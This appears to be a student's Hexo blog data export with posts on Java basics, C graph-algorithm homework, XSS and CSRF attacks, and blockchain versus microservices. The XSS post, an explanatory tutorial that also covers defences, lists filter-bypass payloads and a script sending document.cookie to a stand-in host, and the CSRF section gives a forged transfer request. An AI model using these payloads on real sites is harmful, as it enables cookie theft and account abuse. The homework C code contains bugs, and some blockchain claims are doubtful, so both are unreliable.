{"meta":{"title":"小川的博客","subtitle":"","description":"后端开发，前端学习ing","author":"小川","url":"https://github.com/z-anshun/z-anshun.github.io/tree/master","root":"/"},"pages":[{"title":"","date":"2020-10-07T15:52:46.169Z","updated":"2020-10-07T15:52:46.169Z","comments":true,"path":"js/load-aplayer.js","permalink":"https://github.com/z-anshun/z-anshun.github.io/tree/master/js/load-aplayer.js","excerpt":"","text":"document.addEventListener(\"DOMContentLoaded\", function() { let apContainer = document.createElement(\"div\"); apContainer.id = \"aplayer\"; document.body.append(apContainer); const ap = new APlayer({ container: document.getElementById(\"aplayer\"), fixed: true, audio: [ { name: \"name\", artist: \"artist\", url: \"url.mp3\", cover: \"cover.jpg\", }, ], }); });"},{"title":"tags","date":"2020-10-08T05:03:55.000Z","updated":"2020-10-08T06:42:58.608Z","comments":false,"path":"tags/index.html","permalink":"https://github.com/z-anshun/z-anshun.github.io/tree/master/tags/index.html","excerpt":"","text":""},{"title":"categories","date":"2020-10-08T05:07:02.000Z","updated":"2020-10-08T05:10:57.839Z","comments":false,"path":"categories/index.html","permalink":"https://github.com/z-anshun/z-anshun.github.io/tree/master/categories/index.html","excerpt":"","text":""},{"title":"about","date":"2020-10-08T05:13:07.000Z","updated":"2020-10-08T06:46:16.747Z","comments":true,"path":"about/index.html","permalink":"https://github.com/z-anshun/z-anshun.github.io/tree/master/about/index.html","excerpt":"","text":"nothing"},{"title":"girls","date":"2020-10-08T05:13:07.000Z","updated":"2020-10-08T06:23:28.959Z","comments":true,"path":"girls/index.html","permalink":"https://github.com/z-anshun/z-anshun.github.io/tree/master/girls/index.html","excerpt":"","text":""},{"title":"links","date":"2020-10-08T05:13:07.000Z","updated":"2020-10-08T06:23:45.074Z","comments":true,"path":"links/index.html","permalink":"https://github.com/z-anshun/z-anshun.github.io/tree/master/links/index.html","excerpt":"","text":""},{"title":"四大皆空","date":"2020-10-08T05:49:37.973Z","updated":"2020-10-08T05:49:37.973Z","comments":true,"path":"/404.html","permalink":"https://github.com/z-anshun/z-anshun.github.io/tree/master/404.html","excerpt":"","text":""}],"posts":[{"title":"JAVA学习第一天","slug":"day01","date":"2021-02-04T14:28:28.000Z","updated":"2021-02-04T14:32:48.326Z","comments":true,"path":"2021/02/04/day01/","link":"","permalink":"https://github.com/z-anshun/z-anshun.github.io/tree/master/2021/02/04/day01/","excerpt":"","text":"梦开始的地方12345public class main &#123; public static void main(String[] args)&#123; System.out.println(&quot;hello world&quot;); &#125;&#125; 前言Java的简介java具有三个发展方向，分别是 JAVA SE: JAVA的核心语言类，也是我要学的，主要是数据库的连接，接口的定义，输入/输出和网络编程 JAVA ME: 主要用于软件的开发 JAVA EE: 包含java se的类，还包含企业级应用的类 为什么要学java？ 简洁：前身是基于C++开发的OAK，从而省略了C++中个别繁琐的特性（当然，个人认为，golang还是更简洁一点） 可移植性：能够在多个平台上运行 面向对象： 适合分布式运算：这是最近比较热门的东西，因为java具有强大的联网能力，可以远程访问文件就像url一样访问远程对象一样 性能好 健壮、防患于未然：由于java具有伪编译这一层（即先将其转化为字节码，再解释），从而再伪编译时，就会将正常运行时的错误找出来 多线程 安全 动态语言：跟py一样 Java的运行机制计算机高级语言主要有编译性和解释性两种类型，而Java就是这两种类型的集合， 假设，我们写了一个main.java的文件，它会首先将它编译成main.class，然后再解释为字节。（这里要注意的是，执行这个class文件的是在JVM（Java Virtual Machine）上执行的，也就是一虚拟机，而java解释器就负着这个虚拟机的运行，所以跟计算机无关，提高了可移植性） 补充：这里的JVM会自己识别操作系统，从而进行不同的处理，换句话说，这里的JVM充当了一个翻译官的身份。 环境配置jetbrain 一键配置 Hello world!123456// 跟其它语言一样，main为入口public class main&#123; public static void main(String []args)&#123; System.out.println(&quot;Hello world!&quot;); // Hello world! &#125;&#125; 补充：这里的String[] args、String []args和String args[]都是一样的 classpath在前面，我们已经提到过，每次的程序启动，都会创建一个JVM，而calsspsth，顾名思义，就是去寻找class的路径。我们可以通过set callspth=xxx来设置，默认就是当前目录 变量的声明由于java的是根据C++的，而C++又是根据C的，所以这里的变量声明是类似于C的 基本数据类型12345678910111213141516171819public class TestInt&#123; // 这里的main为主方法，class main就是主类 public static void main(String []args)&#123; int num=10; // 这里不像go那样 var int num=10 long l = 10; short s=1; boolean t=true; float f= 1.022F; // 如果是小数，后面就得跟F。因为默认的小数的double，所以不加的话，在编译时就会出错 double d=2.22; // 这里得D可有可无 byte b=&#x27;a&#x27;; char c=&#x27;a&#x27;; char []ch=&#123;&#x27;a&#x27;,&#x27;s&#x27;&#125;; System.out.println(num);// 10 System.out.printf(&quot;float=%f\\n&quot;,f);//1.022000 System.out.printf(&quot;byte=%c\\nchar=%c\\n&quot;,b,c);// a a System.out.println(ch);// as &#125;&#125; 注意，因为java里面都是类，所以这里的TestInt就是主类的名字，并且，这个类还必须和文件名一样 还有，对于public class和class的区别就是，public class必须跟文件名一样，而class不用 123456// 这里注意命名规范，类开头都要大写class Test&#123; public static void test(String args[])&#123; System.out.println(&quot;This is a test&quot;); &#125;&#125; 再补充一点，所以的数据初始默认为对应类型的0；~sum为输出sum的反码 注释 单行：// 多行：/* */ 文档：/** */ 扩大转换对于java是强类型语言，你不能直接去改变一个类型，只能调用相应的函数或方法，即显示的转换它。因此，java里的类型转换是安全的，比如short专int，只能往占用内存大的转换，并且在表达式中，如果byte这些，都默认为int 如： 1234567public class main&#123; public class void main(String []args)&#123; float f=1.0F; int i=(int)f; System.out.Println(i);// 1 &#125;&#125; 运算符基础，自行解决 选择和循环基础就不提了 注意的是switch跟c一样，每次判断后需要break，如： 12345678910111213public static void sw() &#123; int i = 10; switch (i/2) &#123; case 1: break; case 2: break; case 3: break; default: System.out.println(&quot;default&quot;); &#125;&#125; if if else while do while for(初值;判断条件;操作) 如： 12345678910class ForNestedDemo&#123; public static void main()&#123; for(int i=1;i&lt;=9;i++)&#123; for(int j=1;j&lt;=i;j++)&#123; System.out.print(i+&quot;*&quot;+j+&quot;=&quot;+i*j+&quot;\\t&quot;); &#125; System.out.println(); &#125; &#125;&#125; 数组12345678class Arr&#123; public static void main()&#123; int arr[]=null; arr=new int[10]; arr[0]=1; System.out.println(arr.toString()); &#125;&#125; 这里，因为数组为引用类型，所以初始定义为null，后面再用new构造 虽然，再JDK1.5后，不必对数组地址进行初始化，但为了规范，最好还行进行初始化 补充：引用类的地址属于栈分配，而数据属于堆分配。即上面的arr为栈分配的，arr[3]为堆分配的 二维跟一维类似，这里就不提了 12345678class Arr&#123; public static void main()&#123; int arr[][][]=null; arr=new int[1][1][1]; arr[0][0][0]=12; System.out.println(arr[0][0][0]); &#125;&#125; 但是，这里的构造new直接就可构造几维的，不需要像golang，c那样层层的构造 方法声明1234public static 返回类型 方法名(参数)&#123; 语句; return xxx; // 只有在返回类型为void时，可以省略&#125; 如果只主类的主方法，就是一定要带上public，其它的，可带可不带 命名规范跟类不同，类是每个单词的首字母大写，而方法是第一个单词的首字母小写，其它大写（如：addOne,addTwo） 方法的重载首先，我们思考一个问题，System.out.println()为什么能打印整形，字符串，布尔等类型呢？ 我们再来看一段代码 123456789101112131415public class main &#123; public static void main(String args[]) &#123; add(1,2); add(1,2,3); &#125; static int add(int x,int y)&#123; return x+y; &#125; static int add(int x,int y,int z)&#123; return x+y+z; &#125; static float add(float x,float y)&#123; return x+y; &#125;&#125; 很明显，这个程序是没有错误的，换句话说，在JAVA里面，即使方法名相同，参数不同，都会被当成不同的函数。 因此，System.out.println()会自动寻找其对于的方法 注意：重载只在参数上，不在返回类型上，即： static int add(int x,int y)和static float add(int x,int y)会被认为是同一个方法 可变参数public static fun(int... arg) 跟go类似，便不再多提 foreach类型于for range 如： 12345public static void fun(int... arg) &#123; for (int x : arg) &#123; System.out.println(x); &#125;&#125; 总结： JAVA的优点 JVM提供的可移植性 类 class，主类public class（主类必须和文件名一致） 方法 static int fun(params)，主方法public int main(String args[]) 命名规范 类的首字母大写，方法就第一个单词首字母小写 方法的重载，类似于golang的接口（都是找到对应方法），但重载只在于参数 foreach类似于go的for rang，python的for in","categories":[{"name":"学习","slug":"学习","permalink":"https://github.com/z-anshun/z-anshun.github.io/tree/master/categories/%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"JAVA","slug":"JAVA","permalink":"https://github.com/z-anshun/z-anshun.github.io/tree/master/tags/JAVA/"}]},{"title":"数据结构作业","slug":"work","date":"2020-11-30T13:57:35.000Z","updated":"2020-11-30T13:56:44.128Z","comments":true,"path":"2020/11/30/work/","link":"","permalink":"https://github.com/z-anshun/z-anshun.github.io/tree/master/2020/11/30/work/","excerpt":"","text":"数据结构作业T1邻接矩阵的做法首先，先声明邻接矩阵的结构体 12345678910111213141516171819202122232425262728293031int Visited[MAX_VERTEX_NUM]; /*访问标志数组(全局量) 用于访问标记*/// 图的数据结构：邻接多重表typedef enum&#123; unvisited, visited&#125; VisitIf;// 邻接多重表的边typedef struct EBox&#123; VisitIf mark; // 访问标记 int ivex, jvex; // 两个顶点位置 struct EBox *ilink, *jlink; // 两个顶点的下一条边 char *info; // 和边的有关信息&#125; EBox;// 表头结点typedef struct VexBox&#123; char data; // 对应数据 EBox *firstedge; // 指向第一条依附该顶点的边&#125; VexBox;// 邻接多重表typedef struct&#123; VexBox adjmulist[MAX_VERTEX_NUM];c int vexnum, edgenum; // 顶点数和边数&#125; AMLGraph; 然后声明三个函数（这里可不用出现在作业里，而且我也在网上copy的，只是为了方便理解），分别是： LocateVex: 根据值，找到对应的顶点 FirstAdjvex: 找到该结点的第一个邻接顶点 NextAdjvex: 找到该结点的下一个邻接顶点 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263int LocateVex(AMLGraph *G, char u) //在邻接多重表定位u顶点&#123; int i; for (i = 0; i &lt; G-&gt;vexnum; i++) if (u == G-&gt;adjmulist[i].data) return i; return -1;&#125;//返回v的顶点值int FirstAdjvex(AMLGraph *G, char v) //寻找v点的第一邻接点&#123; int i; i = LocateVex(G, v); //定位V顶点 if (i &lt; 0) return -1; else if (G-&gt;adjmulist[i].firstedge != NULL) //说明该顶点存在邻接点 &#123; if (G-&gt;adjmulist[i].firstedge-&gt;ivex == i) //如果该顶点所接边的ivex是i的话 &#123; return G-&gt;adjmulist[i].firstedge-&gt;jvex; //该顶点的邻接点是jvex &#125; else return G-&gt;adjmulist[i].firstedge-&gt;ivex; //否则该顶点的邻接点是ivex &#125; else return -1;&#125;int NextAdjvex(AMLGraph *G, char v, char w) //寻找v顶点的邻接点w的下一邻接点&#123; int i, j; EBox *p; i = LocateVex(G, v); //分别寻找i顶点和j顶点 j = LocateVex(G, w); if (i &lt; 0 || j &lt; 0) return -1; p = G-&gt;adjmulist[i].firstedge; //p指向顶点v的第一条边 while (p != NULL) if (p-&gt;ivex == i &amp;&amp; p-&gt;jvex != j) //不是邻接顶点(情况1) p = p-&gt;ilink; //找下一邻接顶点 else if (p-&gt;jvex == i &amp;&amp; p-&gt;ivex != j) //不是邻接顶点(情况2) p = p-&gt;jlink; //找下一邻接顶点 else break; //否则是邻接顶点 if (p &amp;&amp; p-&gt;ivex == i &amp;&amp; p-&gt;jvex == j) //找到邻接顶点w (情况1) &#123; p = p-&gt;ilink; if (p &amp;&amp; p-&gt;ivex == i) return p-&gt;jvex; else if (p &amp;&amp; p-&gt;jvex == i) return p-&gt;ivex; &#125; if (p &amp;&amp; p-&gt;ivex == j &amp;&amp; p-&gt;jvex == i) //找到邻接顶点w (情况2) &#123; p = p-&gt;jlink; if (p &amp;&amp; p-&gt;ivex == i) return p-&gt;jvex; else if (p &amp;&amp; p-&gt;jvex == i) return p-&gt;ivex; &#125; return -1;&#125; 最后，实现要求（总的来说就是遍历问题） 1234567891011121314151617181920212223242526272829303132333435363738// 要求：判断一个无向图G是否为一颗树// 思路：图连通图，为n为顶点数，边数为（2*n-1)的图为树// 时间复杂度: O(n)int JudgeIsTree(AMLGraph *G)&#123; int vNum, eNum = 0; // 遍历的结点数和边数 // 这里采用深度优先搜索 DFS(G, 0, vNum, eNum); if (vNum == G-&gt;vexnum &amp;&amp; eNum == 2 * (G-&gt;vexnum - 1)) return 1; else return 0;&#125;void DFS(AMLGraph *G, int v, int *vNum, int *eNum) //从顶点v开始深度优先遍历&#123; char u; // 该结点的data int w; Visited[v] = 1; //遍历后v点标志域改为1 (*vNum)++; // 结点数+1 u = G-&gt;adjmulist[v].data; // 遍历该结点的边 // FirstAdjve -&gt; 返回u的第一个邻接点 NextAdjvex -&gt; 返回w的下一个邻接点 for (w = FirstAdjvex(G, u); w &gt;= 0; w = NextAdjvex(G, u, G-&gt;adjmulist[w].data)) &#123; (*eNum)++; // 边数 +1 // 如果还没有访问的结点,则继续访问 if (Visited[w] == 0) &#123; DFS(G, w, vNum, eNum); &#125; &#125;&#125; 邻接矩阵实现1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162#include &lt;stdio.h&gt;#define MaxSize 50 /*最大顶点个数*/typedef enum&#123; DG, DN, UG, UN&#125; GraphKind; /*图的类型：有向图、有向网、无向图和无向网*/typedef struct ArcNode /*边表结点的类型定义*/&#123; int adjvex; /*弧指向的顶点的位置*/ char *info; /*与弧相关的信息*/ struct ArcNode *nextarc; /*指示下一个与该顶点相邻接的顶点*/&#125; ArcNode;typedef struct VNode /*表头结点的类型定义*/&#123; char data; /*用于存储顶点*/ ArcNode *firstarc; /*指示第一个与该顶点邻接的顶点*/&#125; VNode, AdjList[MaxSize];typedef struct /*图的类型定义*/&#123; AdjList vertex; int vexnum, arcnum; /*图的顶点数目与弧的数目*/ GraphKind kind; /*图的类型*/&#125; AdjGraph;int visited[MaxSize];// 时间复杂度：O(n)int JudgeIsTree(AdjGraph *G)&#123; int vNum, eNum = 0; // 遍历的结点数和边数 // 这里采用深度优先搜索 DFS(G, 0, vNum, eNum); if (vNum == G-&gt;vexnum &amp;&amp; eNum == 2 * (G-&gt;vexnum - 1)) return 1; else return 0;&#125;// 深度优先搜索遍历结点void DFS(AdjGraph *G, int v, int *vNum, int *eNum)&#123; ArcNode *p; visited[v] = 1; // 标记已遍历 (*vNum)++; // 已遍历节点数+1 p = G-&gt;vertex[v].firstarc; // 获取头部结点指向的第一个 while (p != NULL) &#123; (*eNum)++; // 边数+1 // 如果该结点未被遍历，就递归进行DFS if (visited[p-&gt;adjvex] == 0) DFS(G, p-&gt;adjvex, vNum, eNum); // 下一个结点 p = p-&gt;nextarc; &#125;&#125; T2123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172#include &lt;stdio.h&gt;#define MaxSize 50 /*最大顶点个数*/typedef enum&#123; DG, DN, UG, UN&#125; GraphKind; /*图的类型：有向图、有向网、无向图和无向网*/typedef struct ArcNode /*边表结点的类型定义*/&#123; int adjvex; /*弧指向的顶点的位置*/ char *info; /*与弧相关的信息*/ struct ArcNode *nextarc; /*指示下一个与该顶点相邻接的顶点*/&#125; ArcNode;typedef struct VNode /*表头结点的类型定义*/&#123; char data; /*用于存储顶点*/ ArcNode *firstarc; /*指示第一个与该顶点邻接的顶点*/&#125; VNode, AdjList[MaxSize];typedef struct /*图的类型定义*/&#123; AdjList vertex; int vexnum, arcnum; /*图的顶点数目与弧的数目*/ GraphKind kind; /*图的类型*/&#125; AdjGraph;int visited[MaxSize];// 要求:非递归实现邻接表的DFS// 思路：能用递归完成，基本都能用栈实现，在需要递归的地方，将结点信息存入栈中，然后再取出// 时间复杂度：O(n)void DFS(AdjGraph *G, int v)&#123; ArcNode *p; int top; Stack s; // 假设这是跟栈，储存结点信息 // 开始遍历 for (int i = 0; i &lt; G-&gt;vexnum; i++) &#123; // 如果该点未被遍历 if (!visited[i]) &#123; visited[i] = 1; // 标记 PushStack(*s, i); // 进栈 p = G-&gt;vertex[i].firstarc; // 获取该点的第一个邻接结点 // 循环，直到栈不空 while (!StackIsEmpty(s)) &#123; while (p) &#123; if (!visited[p-&gt;adjvex]) &#123; visited[p-&gt;adjvex] = 1; PushStack(*s, p-&gt;adjvex); // 进栈 p = G-&gt;vertex[p-&gt;adjvex].firstarc; &#125; else p = p-&gt;nextarc; &#125; top = PopStack(s, *top); // 出栈，并将栈顶元素赋给top p = G-&gt;vertex[top].firstarc; &#125; &#125; &#125;&#125; 这里栈功能我并没有去写出实现（主要是麻烦），当然，栈也可也存结点，我这里只是存的结点信息（也就是在AdjList的位置）","categories":[{"name":"作业","slug":"作业","permalink":"https://github.com/z-anshun/z-anshun.github.io/tree/master/categories/%E4%BD%9C%E4%B8%9A/"}],"tags":[{"name":"数据结构","slug":"数据结构","permalink":"https://github.com/z-anshun/z-anshun.github.io/tree/master/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"}]},{"title":"XSS攻击和CSRF攻击","slug":"xss","date":"2020-10-25T04:40:21.000Z","updated":"2020-10-25T04:59:00.013Z","comments":true,"path":"2020/10/25/xss/","link":"","permalink":"https://github.com/z-anshun/z-anshun.github.io/tree/master/2020/10/25/xss/","excerpt":"","text":"XSS攻击 “XSS是跨站脚本攻击(Cross Site Scripting)，为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。”【摘自维基百科】 xss 主要分为三类： DOM xss :DOM即文本对象模型，DOM通常代表在html、xhtml和xml中的对象，使用DOM可以允许程序和脚本动态的访问和更新文档的内容、结构和样式。它不需要服务器解析响应的直接参与，触发XSS靠的是浏览器端的DOM解析，可以认为完全是客户端的事情。 反射型 xss :反射型XSS也被称为非持久性XSS，是现在最容易出现的一种XSS漏洞。发出请求时，XSS代码出现在URL中，最后输入提交到服务器，服务器解析后在响应内容中出现这段XSS代码，最后浏览器解析执行。 存储型 xss :存储型XSS又被称为持久性XSS，它是最危险的一种跨站脚本，相比反射型XSS和DOM型XSS具有更高的隐蔽性，所以危害更大，因为它不需要用户手动触发。 允许用户存储数据的web程序都可能存在存储型XSS漏洞，当攻击者提交一段XSS代码后，被服务器端接收并存储，当所有浏览者访问某个页面时都会被XSS，其中最典型的例子就是留言板。 说白了就是当你游览一下页面的时候，它可能就会窃取一些你的信息 DOM xss我们先来看一个例子 12345678910&lt;html&gt;&lt;head&gt; &lt;title&gt;留言板&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;div id=”board”&gt; &lt;script&gt;alert(&quot;hello world&quot;)&lt;/script&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 这是一段很简单的HTML代码，当你访问这个页面的时候，就会有提示框弹出 虽然这里是“hello world”，但在真正的xss攻击中，还能做很多事情 比如： 1.窃取网页浏览中的cookie值 ​ js中有这样一个代码document.cookie，相信这个大家都知道吧，就是获取cookie，但是假设这个cookie是你登录某个页面时留下来的，这个cookie就相当于你的令牌。换句话说如果像空间说说中能够写入xss攻击语句，那岂不是看了你说说的人的号 你都可以登录 不过我们也可以设置：Http-Only（只有在http请求头中会有此cookie信息，而不能通过document.cookie来访问此cookie） 保证同一cookie不能被滥用 2.劫持流量实现恶意跳转 ​ 试想一下，有这样一段代码 1&lt;script&gt;window.location.href=&quot;http://www.baidu.com&quot;;&lt;/script&gt; 那么所访问的网站就会被跳转到百度的首页（该代码就是当有人访问这个页面的时候，这个事件都会发送，从而实现跳转） 据了解：在2011年新浪就曾爆出过严重的xss漏洞，导致大量用户自动关注某个微博号并自动转发某条微博 反射型 xss反射型xss主要运用的是利用与绕过 大小写绕过 个别网站可能会过滤掉script标签，但是却没想到标签中的大小写并不影响浏览器的解释 如下： 1http://192.168.1.102/xss/example2.php?name=&lt;sCript&gt;alert(&quot;hey!&quot;)&lt;/scRipt&gt; 如果访问这个网站，就会打印出‘hey’，换句话说&lt;script&gt;中的脚本被执行了 利用过滤后的返回语句再次构成攻击语句来绕过攻击 换句话说就是让过滤掉后了的语句中任有 script 标签 如： 1http://192.168.1.102/xss/example3.php?name=&lt;sCri&lt;script&gt;pt&gt;alert(&quot;hey!&quot;)&lt;/scRi&lt;/script&gt;pt&gt; 这个了只过滤掉了 &lt;sCri 和 &lt;/scRi，但仍还有 script 标签，也就是仍然可以执行脚本 插入其它标签的代码 首先，并不是只有script标签的插入能够植入脚本的 比如 1http://192.168.1.102/xss/example4.php?name=&lt;img src=&#x27;w.123&#x27; onerror=&#x27;alert(&quot;hey!&quot;)&#x27;&gt; 这里虽然插入的img标签，但该标签中的onerror事件任然执行了，也到达到了其目的 再比如 1&lt;a onmousemove=’do something here’&gt; 这里的onmousemove也能触发事件，其它还有onclick（点击事件发生）、onmouseenter（鼠标指针移动到元素上时触发事件）这类的，这些就涉及到一些前端的了，我在这里就不赘述 编码要植入的脚本代码绕过关键字的过滤 js中有个eval()方法，会将编码过的语句解码后再执行，从而便能绕过关键字过滤，如： 1http://192.168.1.102/xss/example5.php?name=&lt;script&gt;eval(\\u0061\\u006c\\u0065\\u0072\\u0074(1))&lt;/script&gt; 这里的\\u0061\\u006c\\u0065\\u0072\\u0074(1)，是alert(1)编码后的 主动闭合标签实现注入 我们先来看一份代码截图 这里，直接在js中拿取变量，但是，js不像go语言那种强类型语言，js是弱类型的，也就是对变量并没有明确的定义，所以当我们输入： 12http://192.168.1.102/xss/example6.php?name=&quot;;alert(&quot;I am ahacker~&quot;);&quot; 其代码就变成了这样，完成了脚本的植入 存储型 xss储存，就如字面上的意思，讲恶意代码储存在数据库里，通常是在留言板使用（可以设想一下，当一个人读留言板时，服务器肯定会向用户展示留言板的内容，但如果留言板储存的恶意脚本，不就执行了？就跟上面新浪微博的那个事件一样），这个跟反射型 xss不同的是，只需要用户访问这个页面就行了 这个跟DOM类型的 xss很相似 比如你在一个留言板上这么写 12345&lt;script&gt; while (true) &#123; alert(&#x27;Hello&#x27;) &#125;&lt;/script&gt; 那这个网站就可能会挂 或者这么写 123456&lt;script&gt; var img = document.createElement(&#x27;img&#x27;) img.src=&#x27;http://www.xss.com?cookie=&#x27; + document.cookie img.style.display=&#x27;none&#x27; document.getElementsByTagName(&#x27;body&#x27;)[0].appendChild(img) &lt;/script&gt; 这就就是将你该页面的cookie发送到http://www.xss.com这个网址（这个跟后面要说csrf是有点不一样，但一般是这两种混合来使用） 如何预防xss？ 首先是过滤。对诸如&lt;script&gt;、&lt;img&gt;、&lt;a&gt;等标签进行过滤。（尽管可能会逃过） 其次是编码。像一些常见的符号，如&lt;&gt;在输入的时候要对其进行转换编码，这样做浏览器是不会对该标签进行解释执行的，同时也不影响显示效果。 最后是限制。通过以上的案例我们不难发现xss攻击要能达成往往需要较长的字符串，因此对于一些可以预期的输入可以通过限制长度强制截断来进行防御（这里要记住，不能只是单纯的在表单里设置长度，因为是可以改的） CSRF攻击说完了上面的xss攻击，现在，我们来看看csrf攻击 概念：CSRF攻击，英文全称为Cross-site request forgery，中文的名称为跨站请求伪造，也被称为one click attack/session riding，其缩写为CSRF/XSRF,是一种非常常见的Web攻击方式 换句话说：就是hacker盗取了你的信息（比如 cookie，token这些），然后再以你的名义发送请求 比如： 首先用户在A网站登录了支付宝，然后支付宝把cookie返回给了游览器，但是，该用户在还没退出A网页时，又登录了恶意网站B，然后B网站又发送了一些带攻击型的代码，发送请求要求访问A网站，在这种情况下，用户并不知道发生了什么，但A网站是根据发了的cookie权限处理该请求的，并不知道该请求其实是由B发起的。 举个例子 如果某个银行网站，对转账的请求为：http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000 那么如果在网站B上，有这样一行代码 1&lt;img src=http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000&gt; 这里的以GET的方式请求第三方资源（这里的第三方就是指银行网站了，原本这是一个合法的请求，但这里被不法分子利用了），而又恰好你刚刚登录了A网站，游览器还存又cookie，所以当你登录B网站时，浏 览器会带上你的银行网站A的Cookie发出Get请求 虽然这只是一个简单的例子，但即使该银行换成只能post表单请求，但B网站也能发送POST表单请求，这里我就不赘述了 其实可以看出，CSRF攻击是源于WEB的隐式身份验证机制，WEB的身份验证机制虽然可以保证一个请求是来自于某个用户的浏览器，但却无法保证该请求是用户批准发送的（也就是即是我们拿到了令牌，也不知道是否是用户批准的） 如何防御？ 验证码， 强制让用户在进行每次操作的时候输入验证码，以便让他知道自己在干什么（虽然这样给用户的体验会很不好） 检查HTTP Referer字段 在HTTP请求中，Referer字段的数据会带着上一次请求的地址，因此我们通过获取Referer字段，检测该字段是否为我们自己的站点地址，这样就可以避免CSRF攻击 但是这也有缺点 用户设置禁止发送Referer字段（跟设置禁止保存cookie是一样的） 个别插件可以伪造Referer字段 设置Token 很明显，CSRF攻击的本质是攻击者可以猜测到构造一个请求所需要的参数（也就是令牌），那么，如果要防御，其方法就是让参数变得不可猜测，token就可以做到 但要注意的是 token必须保密（也就是加密） 提交token时，不可直接放在url中（所以我们直接放在头部） 避免全站通用cookie，设置好cookie的域 总结：CSRF利用的是网站的令牌去请求，这属于网站本身的漏洞 XSS属于的是注入攻击，大多在留言板上（虽然现在一般的网址已经不行了）","categories":[{"name":"技术交流","slug":"技术交流","permalink":"https://github.com/z-anshun/z-anshun.github.io/tree/master/categories/%E6%8A%80%E6%9C%AF%E4%BA%A4%E6%B5%81/"}],"tags":[{"name":"web攻击","slug":"web攻击","permalink":"https://github.com/z-anshun/z-anshun.github.io/tree/master/tags/web%E6%94%BB%E5%87%BB/"}]},{"title":"初步了解区块链与微服务","slug":"struct","date":"2020-10-19T13:53:49.000Z","updated":"2020-10-25T07:01:55.353Z","comments":true,"path":"2020/10/19/struct/","link":"","permalink":"https://github.com/z-anshun/z-anshun.github.io/tree/master/2020/10/19/struct/","excerpt":"","text":"因为对于个人而言，我经常搞混区块链和分布式，所以便狠下决心写了这篇文章 区块链 概念：从科技层面来看，区块链涉及数学、密码学、互联网和计算机编程等很多科学技术问题。从应用视角来看，简单来说，区块链是一个分布式的共享账本和数据库，具有去中心化、不可篡改、全程留痕、可以追溯、集体维护、公开透明等特点【摘自百度百科】 主要运用于金融、物联网和物流领域、公共服务领域等 1.要了解区块链，我们先来了解一个概念 去中心化去中心化 在一个分布有众多节点的系统中，每个节点都具有高度自治的特征。节点之间彼此可以自由连接，形成新的连接单元。任何一个节点都可能成为阶段性的中心，但不具备强制性的中心控制功能。节点与节点之间的影响，会通过网络而形成非线性因果关系。这种开放式、扁平化、平等性的系统现象或结构，我们称之为去中心化【摘自百度百科】 简单的来说，去中心化，就是不要中心，人人都可能成为中心的意思。（例如：Facebook，博客这类） 2.然后，为什么需要区块链这个东西呢？咱们以支付包转账举例： 这里，假设用户A购买了用户B的商品，支付宝便是第三方负责这个交易的。但，假设我们使用跑代码的方法进行入账和出账（这里补充一点，支付宝一开始人工处理这些交易的），怎么才能保证绝对的安全呢？很明显这点很难做到 这便是传统的中心化（所有的用户都以支付宝为中心）： 3.去中心化服务的区块链为了解决人工，安全等问题，支付宝便使用了区块链网络 用户各自为节点，各自为中心，每一个人都拥有各自的一个密钥，每个人都拥有着同一个账本，而不是由支付宝一个人账了。 这里可能又有人要问了，如果我修改了自己的拥有的那一份账本上自己的数据（假设你给自己账户+2 000 000），会造成什么影响呢？ 假设你修改了，但是其它51%的人的账户都还是显示的你是原来账户上的数据所以并不会改变（这也是传说中的比特币为什么那么难以攻破它市值的原因） （如果大家看过“硅谷“这个电视剧，有一个片段就是将的一个攻防战，讲的就是一个去中心化的服务，谁先占有51%的用户，就拥有网络的操作权） 分步式服务略微了解了区块链后，现在我们来了解下分布式服务框架（因为这两个对于刚开始了解的人很容易搞混） 概念：当计算机的程序和数据通过网络分布在多于一个的计算机上时，计算就成为“分布式的” 简单来说，就是一个硬件或软件组件分布在不同的网络计算机上，彼此之间仅仅通过消息传递进行通信和协调的系统，常见的消息传递就是通过HTTP的RESTful API进行传输 1.为什么要有分布式服务?首先，假设我们有个抢票系统的服务，并且这个使用的是单架构模式 若一个用户购票后，我们需要对数据库进行进行用户信息的处理和影票信息的处理 这里需要先了解：一个tomcat通常能够承载200~300并发（取决于硬件及网络等外界条件），一个mysql默认并发数100 所以，如果有大量用户同时购买，对数据库的压力就会很大，若其中用户信息溢出或影票信息的临时更新，都会导致整个服务不可用。 2.什么是分布式架构模式 概念：整个系统的功能单位分散到不同的进程,**然后够个进程共同提供不同的业务能力**,我们称之为”分布式架构”(Distributed Architecture) 光看概念肯定是难以理解，下面还是借用上面那个例子来举例 很明显两个数据库各储存各的，即是一个宕机了，也不会影响另一个。虽然我们看似分开处理比合并着处理好多了。但这也是有缺点的，一是数据库多了。维护成本自然大了，二则是对资源的要求也增加了。 3.微服务架构模式这里只做点了解，why？（因为我也不是很会） 首先先来了解什么是微服务 简单来说微服务就是很小的服务，小到一个服务只对应一个单一的功能，只做一件事。这个服务可以单独部署运行，服务之间可以通过RPC来相互交互，每个微服务都是由独立的小团队开发，测试，部署，上线，负责它的整个生命周期 那微服务架构又是啥？ 在做架构设计的时候，先做逻辑架构，再做物理架构，当你拿到需求后，估算过最大用户量和并发量后，计算单个应用服务器能否满足需求，如果用户量只有几百人的小应用，单体应用就能搞定，即所有应用部署在一个应用服务器里，如果是很大用户量，且某些功能会被频繁访问，或者某些功能计算量很大，建议将应用拆解为多个子系统，各自负责各自功能，这就是微服务架构。 分布式和微服务的区别： ​ 1.生产环境下的微服务肯定是分布式部署的，分布式部署的应用不一定是微服务架构的，比如集群部署，它是把相同应用复制到不同服务器上，但是逻辑功能上还是单体应用。 ​ 2.微服务架构模式很像分布式，但它的粒度更小，服务之间耦合度更低，由于每个微服务都由独立的小团队负责，因此它敏捷性更高，但维护起来也更麻烦 4.总结 单体架构 分布式架构 优点 1.易于开发 2.易于部署 3.易于扩展（后续可扩展多个副本） 1.吞吐量大 2.单个服务维护成本低 